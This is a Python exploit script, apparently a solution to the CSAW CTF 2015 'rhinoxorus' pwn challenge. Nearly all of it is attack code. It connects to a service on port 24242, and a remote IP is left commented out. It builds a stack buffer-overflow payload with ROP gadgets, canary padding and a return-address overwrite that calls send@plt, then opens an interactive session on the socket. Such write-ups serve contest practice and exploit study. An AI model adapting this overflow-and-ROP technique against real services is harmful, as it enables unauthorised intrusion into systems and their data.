import struct,socket,telnetlib
# csaw ctf 2015
# exploit 500 rhinoxorus

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<I",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data
s = socket.create_connection(("127.0.0.1",24242))
#s = socket.create_connection(("54.152.37.20",24242))
f = s.makefile('rw',bufsize=0)


# 0x8056afa -> call function_array return address

add_esp = 0x080578f5 # add esp,0xc -> pop4ret

send_plt = 0x8048740
arg1 = 0x4
arg2 = 0x805f0c0
arg3 = 0x100
popret = 0x080485bd

payload = p(popret) # func bd -> 120 bytes
payload += "A" * 4 # padding

payload += p(send_plt) + p(0x90919293) + p(arg1) + p(arg2) + p(arg3)

payload = payload.ljust(120,"A")

payload += "\x00" * 4 # canary

payload += "A" * 12 # for padding

payload += "\x0f\x12\x00\x00" # rewrite ret -> add_esp gadget

payload += "\x00" * 4 # our input pointer

payload += "\xff" # set count to 1  -> trigger BOF

payload = payload.ljust(254,"A")
f.write(payload + "\n") # 255 bytes

shell()
